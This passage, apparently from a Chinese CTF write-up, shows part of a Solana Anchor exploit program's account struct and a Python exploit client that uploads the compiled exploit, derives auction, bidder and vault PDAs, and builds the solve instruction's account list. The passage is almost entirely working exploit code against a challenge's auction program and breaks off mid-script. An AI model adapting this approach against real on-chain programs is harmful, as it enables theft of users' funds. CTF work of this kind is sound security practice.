    <span class="token keyword">pub</span> player<span class="token punctuation">:</span> <span class="token class-name">Signer</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: my_auction</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> my_auction<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: my_bidder_state</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> my_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: admin user</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> admin<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    
    <span class="token comment">/// CHECK: PDA signer</span>
    #<span class="token punctuation">[</span><span class="token function">account</span><span class="token punctuation">(</span>
        <span class="token keyword">mut</span><span class="token punctuation">,</span>
        seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        bump
    <span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">pub</span> exploit_pda<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: BidderState for Exploit (Mut)</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> exploit_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>cargo build-sbf</code> 编译</p>
<p>exp.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base58


<span class="token keyword">def</span> <span class="token function">is_on_curve</span><span class="token punctuation">(</span>bytes_32<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Pure python Ed25519 point validation</span>
    <span class="token comment"># p = 2^255 - 19</span>
    p <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819949</span>
    <span class="token comment"># d = -121665/121666</span>
    d <span class="token operator">=</span> <span class="token number">37095705934669439343138083508754565189542113879843219016388785533085940283555</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bytes_32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>bytes_32<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>
    sign_bit <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>
    y <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>

    <span class="token keyword">if</span> y <span class="token operator">>=</span> p<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token comment"># 0, 1 are valid. (0 off curve? x^2 = -1) -0^2 + 0^2 = 0. -1 off.</span>
    <span class="token comment"># Actually checking x existence is enough.</span>

    y2 <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token operator">%</span> p
    u <span class="token operator">=</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> p
    v <span class="token operator">=</span> <span class="token punctuation">(</span>d <span class="token operator">*</span> y2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> p

    <span class="token comment"># x^2 = u/v</span>
    <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># Undefined? But d*y^2 != -1 for valid y?</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token comment"># Calculate inverse of v</span>
    v_inv <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    x2 <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">*</span> v_inv<span class="token punctuation">)</span> <span class="token operator">%</span> p

    <span class="token comment"># Check if x2 is a quadratic residue</span>
    <span class="token keyword">if</span> x2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>  <span class="token comment"># x=0 point exists.</span>

    <span class="token comment"># Euler's criterion: x2^((p-1)/2) == 1</span>
    <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">find_program_address</span><span class="token punctuation">(</span>seeds<span class="token punctuation">,</span> program_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> bump <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ctx <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> s <span class="token keyword">in</span> seeds<span class="token punctuation">:</span>
            ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span>program_id<span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"ProgramDerivedAddress"</span><span class="token punctuation">)</span>
        hash_bytes <span class="token operator">=</span> ctx<span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># PDA is a valid address if it is NOT on curve</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> is_on_curve<span class="token punctuation">(</span>hash_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> hash_bytes<span class="token punctuation">,</span> bump
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"No PDA found"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_sighash</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
        HOST <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        HOST <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>
    PORT <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token number">1337</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connecting to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>HOST<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PORT<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> s<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">'rb'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment"># Handshake loop</span>
    challenge_id <span class="token operator">=</span> <span class="token boolean">None</span>
    solve_id <span class="token operator">=</span> <span class="token boolean">None</span>
    admin_id <span class="token operator">=</span> <span class="token boolean">None</span>
    player_id <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token comment"># 22222222222222222222222222222222222222222522</span>
    my_program_id_str <span class="token operator">=</span> <span class="token string">"22222222222222222222222222222222222222222522"</span>

    <span class="token comment"># Load exploit binary</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exploit/target/deploy/exploit.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bin_f<span class="token punctuation">:</span>
            program_data <span class="token operator">=</span> bin_f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>
        <span class="token comment"># Fallback path if running from different dir</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment_auction/exploit/target/deploy/exploit.so'</span><span class="token punctuation">,</span>
                  <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bin_f<span class="token punctuation">:</span>
            program_data <span class="token operator">=</span> bin_f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"S> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        <span class="token keyword">if</span> <span class="token string">"program pubkey:"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program ID: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>my_program_id_str<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>my_program_id_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> <span class="token string">"program len:"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
            <span class="token comment"># Server asks for length, then we send data</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program len: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending program data (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>program_data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> bytes)..."</span></span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>program_data<span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Challenge:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            challenge_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Exploit:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># This should match our sent ID</span>
            solve_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Admin:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            admin_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"Player:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            player_id <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment"># If we have all needed IDs, we can proceed</span>
            <span class="token keyword">break</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> challenge_id<span class="token punctuation">:</span>
        <span class="token comment"># Fallback for old behavior (client sends program first blindly)</span>
        <span class="token comment"># But since we saw "program pubkey:", we handled it above.</span>
        <span class="token keyword">pass</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Meta gathered."</span><span class="token punctuation">)</span>

    <span class="token comment"># We no longer need patching as we provided the ID</span>

    <span class="token comment"># Calculate PDAs</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Calculating PDAs..."</span><span class="token punctuation">)</span>
    <span class="token comment"># admin_auction: [b"auction", admin, 1]</span>
    auction_seed <span class="token operator">=</span> <span class="token string">b"auction"</span>
    bidder_seed <span class="token operator">=</span> <span class="token string">b"bidder"</span>
    vault_seed <span class="token operator">=</span> <span class="token string">b"vault"</span>

    admin_auction<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>
        <span class="token punctuation">[</span>auction_seed<span class="token punctuation">,</span> admin_id<span class="token punctuation">,</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>
    <span class="token comment"># admin_bidder_state: [b"bidder", admin_auction, player]</span>
    <span class="token comment"># NOTE: In our loop, we use OUR (player) bidder state on admin auction.</span>
    admin_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>
        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> admin_auction<span class="token punctuation">,</span> player_id<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>

    vault<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span><span class="token punctuation">[</span>vault_seed<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>

    <span class="token comment"># my_auction: [b"auction", player, 999]</span>
    my_auction_id <span class="token operator">=</span> <span class="token number">999</span>
    my_auction<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>
        <span class="token punctuation">[</span>auction_seed<span class="token punctuation">,</span> player_id<span class="token punctuation">,</span>
         struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> my_auction_id<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>

    <span class="token comment"># my_bidder_state: [b"bidder", my_auction, player]</span>
    my_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>
        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> my_auction<span class="token punctuation">,</span> player_id<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>

    <span class="token comment"># --- Exploit PDA Accounts ---</span>
    <span class="token comment"># Exploit PDA: [b"exploit"]</span>
    exploit_pda<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> solve_id<span class="token punctuation">)</span>

    <span class="token comment"># Exploit Bidder State: [b"bidder", my_auction, exploit_pda]</span>
    exploit_bidder_state<span class="token punctuation">,</span> _ <span class="token operator">=</span> find_program_address<span class="token punctuation">(</span>
        <span class="token punctuation">[</span>bidder_seed<span class="token punctuation">,</span> my_auction<span class="token punctuation">,</span> exploit_pda<span class="token punctuation">]</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span>

    system_program <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>  <span class="token comment"># 1111... -> 000... (System program ID is all zeros in base58? NO. 1111... is zeros)</span>
    <span class="token comment"># Actually System Program ID is 11111111111111111111111111111111</span>
    <span class="token comment"># which decodes to 32 bytes of zeros.</span>

    <span class="token comment"># Construct Solve Instruction</span>
    <span class="token comment"># Accounts:</span>
    <span class="token comment"># 0. challenge_program (Exec)</span>
    <span class="token comment"># 1. admin_auction (Mut)</span>
    <span class="token comment"># 2. admin_bidder_state (Mut)</span>
    <span class="token comment"># 3. system_program</span>
    <span class="token comment"># 4. vault (Mut)</span>
    <span class="token comment"># 5. player (Signer, Mut)</span>
    <span class="token comment"># 6. my_auction (Mut)</span>
    <span class="token comment"># 7. my_bidder_state (Mut)</span>
    <span class="token comment"># 8. admin (Mut) used for ClaimWinner</span>

    accounts <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">(</span>
            <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> challenge_id
        <span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># challenge_program (executable? No just account info passed to cpi context)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_auction (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_bidder_state (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> system_program<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># system_program</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> vault<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># vault (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> player_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># player (signer, mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_auction (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_bidder_state (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin (mut)</span>
    <span class="token punctuation">]</span>

    <span class="token comment"># Construct Solve Instruction</span>
    <span class="token comment"># SERVER READS TEXT FORMAT!</span>
    <span class="token comment"># Format:</span>
    <span class="token comment"># "num accounts: "</span>
    <span class="token comment"># &lt;num: text> &lt;newline></span>
    <span class="token comment"># &lt;meta> &lt;pubkey> &lt;newline></span>
    <span class="token comment"># ...</span>
    <span class="token comment"># "ix len: "</span>
    <span class="token comment"># &lt;len: text> &lt;newline></span>
    <span class="token comment"># &lt;data: bytes></span>

    accounts <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> challenge_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># challenge_program</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_auction (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin_bidder_state (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> system_program<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># system_program</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> vault<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># vault (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> player_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># player (signer, mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_auction (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_bidder_state (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin (mut)</span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> exploit_pda<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># exploit_pda </span>
        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> exploit_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># exploit_bidder_state (mut)</span>
    <span class="token punctuation">]</span>

